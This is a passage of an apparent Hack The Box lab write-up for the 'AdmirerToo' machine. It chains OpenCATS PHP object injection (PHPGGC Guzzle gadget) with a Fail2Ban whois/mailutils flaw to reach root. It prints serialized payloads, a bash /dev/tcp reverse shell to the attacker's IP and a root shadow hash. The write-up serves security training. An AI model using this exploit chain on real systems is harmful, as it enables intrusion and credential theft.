<p>According to the blog, activity parameter is vulnerable. So, we need to generate serialized exploit using PHPGGC and replace it with default one.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtYmlvbmljcy9waHBnZ2M=">PHPGGC: PHP Generic Gadget Chains<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>We don’t know where to upload the php webshell and which users permission will be applicable. So I tried to upload it on &#x2F;dev&#x2F;shm directory to find file perms.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt /root/hackthebox/machine/admiretoo/test.txt</span></span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A17%3A%22%2Fdev%2Fshm%2Ftest.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A20%3A%22this+is+just+a+<span class="built_in">test</span>%21%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure>

<p>This is just a test file which will be dumped into ‘&#x2F;dev&#x2F;shm’ directory with user privileges.</p>
<p>As you can see the response is ‘HTTP 200 OK’, so It was successful. Let’s check the file permission.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">ls</span> -la</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwt  2 root  root    60 Jan 23 11:28 .</span><br><span class="line">drwxr-xr-x 16 root  root  3080 Jan 23 09:59 ..</span><br><span class="line">-rw-r--r--  1 devel devel   62 Jan 23 11:28 test.txt</span><br><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">cat</span> test.txt </span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;this is just a test!&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>So, it’s not root who’s permission is being used to run OpenCat’s. It’s ‘devel’.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ grep <span class="string">&#x27;devel&#x27;</span> /etc/passwd</span><br><span class="line">devel:x:1003:1003::/home/devel:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>This user don’t have any shell access, that’s the reason we didn’t get this when we ran which account has shell access. Let’s look into locations ‘devel’ has access to.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ find / -group devel 2&gt;/dev/null</span><br><span class="line">/dev/shm/test.txt</span><br><span class="line">/opt/opencats/INSTALL_BLOCK</span><br><span class="line">/usr/local/src</span><br><span class="line">/usr/local/etc</span><br></pre></td></tr></table></figure>

<p>Two directories and one file. So, there’s no way we can get a reverse shell. So, let’s turn to Fail2Ban exploit.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhaWwyYmFuL2ZhaWwyYmFuL3NlY3VyaXR5L2Fkdmlzb3JpZXMvR0hTQS1tOTg1LTNmM3YtY3dtbQ==">Possible RCE vulnerability in mailing action using mailutils (mail-whois)<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>According to this blog we can get code execution if we edit the &#x2F;etc&#x2F;hosts file and point to my own IP address. However, we don’t have permission to edit the hosts file, only root can edit it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">ls</span> -la /etc/hosts</span><br><span class="line">-rw-r--r-- 1 root root 205 Jul  7  2021 /etc/hosts</span><br></pre></td></tr></table></figure>

<p>But, we can put a whois configuration file in ‘&#x2F;usr&#x2F;local&#x2F;etc’ directory and when we execute whois command it takes configuration file for processing.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">cat</span> /etc/fail2ban/jail.local</span><br><span class="line">[DEFAULT]</span><br><span class="line">ignoreip = 127.0.0.1</span><br><span class="line">bantime = 60s</span><br><span class="line">destemail = root@admirertoo.htb</span><br><span class="line">sender = fail2ban@admirertoo.htb</span><br><span class="line">sendername = Fail2ban</span><br><span class="line">mta = mail</span><br><span class="line">action = %(action_mwl)s</span><br></pre></td></tr></table></figure>

<p>This is the default configuration of jail (fail2ban), if any IP is banned then it sends an email to specified address.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">cat</span> /etc/fail2ban/jail.d/defaults-debian.conf</span><br><span class="line">[sshd]</span><br><span class="line">enabled = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>It is enabled on SSH service. Let’s create whois.conf file on Kali machine first. Whois config file has to be in RegEx format, if not then it’d give you error like below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ whois 10.10.x.x</span><br><span class="line">Invalid regular expression <span class="string">&#x27;[&#123;&quot;Expires&quot;:1,&quot;Discard&quot;:false,&quot;Value&quot;:&quot;.*&#x27;</span>: Unmatched [,</span><br><span class="line">[^, [:, [., or [=</span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JmYzEwMzYvd2hvaXM=">whois<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Below is the default format of uploaded file using OpenCats vulnerability.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ <span class="built_in">cat</span> /dev/shm/hello.txt</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;hello\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>As you can see, my actual data is ‘hello’, but it also adds other data, which is part of the GuzzleHTTP Cookie. So to make a working config file with that, we need to use ‘vertical bar’ and ‘Dot’ of RegEx, just like below.</p>
<p><em><strong>Vertical Bar: OR operator. Search for a match to the regular expression on either side of the vertical bar. Dot: Matches any single character.</strong></em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.x.x]\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>But as we have already seen in hello.txt result, it has already appended the Guzzle data, so we need to create a file without that on your kali machine.</p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># cat demo.conf         </span></span><br><span class="line">&#125;]|. [10.10.14.8]</span><br></pre></td></tr></table></figure>

<p>When we give this file to PHPGGC to serialize, it add the initial part and end part to it. Let’s serialize the configuration file.</p>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /root/hackthebox/machine/admiretoo/demo.conf</span></span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A17%3A%22%7D%5D%7C.+%5B10.10.14.8%5D%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure>

<p>Now before we pass this to OpenCats, we need to create our reverse shell payload on Kali Linux</p>
<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># cat rshell   </span></span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&quot;</span> &amp;</span><br></pre></td></tr></table></figure>

<p><em><strong>The ‘~|’ escape pipes the message composed so far through the given shell command and replaces the message with the output the command produced. If the command produced no output, mail assumes that something went wrong and retains the old contents of your message.</strong></em></p>
<h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># nc -nvlkp 43 -c &quot;cat rshell&quot;</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::43</span><br><span class="line">Ncat: Listening on 0.0.0.0:43</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Listening on Port 43. This port is reserved for ‘whois protocol’</p>
</li>
<li><p>Using ‘-c’ switch to run shell commands after successful connection and providing our payload to run it</p>
</li>
</ul>
<p>If you are wondering why we are using port 43, it’s because when we execute whois command from target machine to our IP address, it use port 43 to connect our IP address and if our IP doesn’t have that port open then it fails. See this below example of whois query.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2136.jpg"></li>
</ul>
<p>Above is the whois query to google server. As you can see, my machine sends an initial syn packet to whois server IP on port 43 TCP.</p>
<p>So, the idea basically is we are redirecting whois request to our Kali Linux machine (IP) rather than actual whois server and when we get hit on our whois port, we run shell commands to exploit the Fail2Ban vulnerability.</p>
<h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvnp 9001</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br></pre></td></tr></table></figure>

<p>Setup a netcat listener for actual reverse shell. Now we are almost ready.</p>
<h3 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h3><p>Now we need to pass the serialized cookie via Burp Suite, just like we did previously.</p>
<h3 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h3><p>Check the dumped file from target machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ <span class="built_in">cat</span> /usr/local/etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.8]&quot;</span>&#125;]</span><br></pre></td></tr></table></figure>

<p>We got the config file on target. This config file gets removed after every five minutes.</p>
<h3 id="Step-8"><a href="#Step-8" class="headerlink" title="Step 8"></a>Step 8</h3><p>Run whois from target machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/dev/shm$ whois 10.10.14.8</span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&quot;</span> &amp;</span><br></pre></td></tr></table></figure>

<p>Make sure to use your own IP address. After executing that we got a hit on port 43 netcat listener.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># nc -nvlkp 43 -c &quot;cat rshell&quot;</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::43</span><br><span class="line">Ncat: Listening on 0.0.0.0:43</span><br><span class="line">Ncat: Connection from 10.10.11.137.</span><br><span class="line">Ncat: Connection from 10.10.11.137:40126.</span><br><span class="line">Ncat: Connection from 10.10.11.137.</span><br><span class="line">Ncat: Connection from 10.10.11.137:40130.</span><br><span class="line">Ncat: Connection from 10.10.11.137.</span><br><span class="line">Ncat: Connection from 10.10.11.137:40132.</span><br></pre></td></tr></table></figure>

<p>At this moment our payload is already delivered to target machine, now we need to trigger Fail2Ban application via failed SSH attempts.</p>
<h3 id="Step-9"><a href="#Step-9" class="headerlink" title="Step 9"></a>Step 9</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/admiretoo]</span><br><span class="line">└─<span class="comment"># ssh root@10.10.11.137                                                                                                     255 ⨯</span></span><br><span class="line">root@10.10.11.137<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">root@10.10.11.137&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">root@10.10.11.137<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Connection closed by 10.10.11.137 port 22</span></span><br></pre></td></tr></table></figure>

<p>just enter 3 wrong password is fine… you will get a reverse connection on Netcat listener.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvnp 9001</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.11.137.</span><br><span class="line">Ncat: Connection from 10.10.11.137:42756.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (3043): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@admirertoo:/<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@admirertoo:/<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@admirertoo:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">de978ef00fa5fd259349809129068f70</span><br><span class="line">root@admirertoo:/<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow | grep root</span><br><span class="line">root:$6$eP5MVyB1lXtVQgzU<span class="variable">$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s</span>.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>Make sure to get root flag or whatever as quick as possible, the shell is unstable and it gets disconnected.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2137.jpg"></li>
</ul>
<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>vhost fuzz with ffuf</li>
<li>SSRF redirect in adminer (CVE-2021-21311)</li>
<li>OpenTSDB 2.4.0 Remote Code Execution (CVE-2020-35476)</li>
<li>password reused</li>
<li>Possible RCE vulnerability in mailing action using mailutils(mail-whois)(CVE-2021-25294)</li>
<li>OpenCATS PHP Object Injection to Arbitrary File Write</li>
<li>PHPGGC: PHP Generic Gadget Chains generate exploits</li>
<li>privesc through Modify the &#x2F;usr&#x2F;local&#x2F;etc&#x2F;whois.conf and whois command</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2022/01/23/admirertoo/" title="Hack-The-Box-walkthrough[admirertoo]">https://fdlucifer.github.io/2022/01/23/admirertoo/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/01/17/mimic-ssti/" rel="prev" title="拟态web---mimic-ssti">
                  <i class="fa fa-chevron-left"></i> 拟态web---mimic-ssti
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/01/23/meta/" rel="next" title="Hack-The-Box-walkthrough[meta]">
                  Hack-The-Box-walkthrough[meta] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">628k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:05</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
